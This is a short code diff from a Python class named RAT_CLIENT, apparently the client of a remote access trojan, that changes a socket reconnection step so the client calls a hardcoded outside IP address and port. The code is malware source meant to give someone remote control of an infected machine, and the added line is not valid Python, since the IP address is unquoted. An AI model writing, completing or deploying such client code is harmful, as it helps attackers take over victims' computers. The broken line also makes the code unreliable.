@@ -50,7 +50,7 @@ class RAT_CLIENT:
             s.send(sending.encode())
         except socket.error as e:
             print (e)
-            rat = RAT_CLIENT(self.host, self.port)
+            rat = RAT_CLIENT(91.109.178.16, 1429)
             print(self.host, self.port)
             if __name__ == '__main__':
                 rat.build_connection()
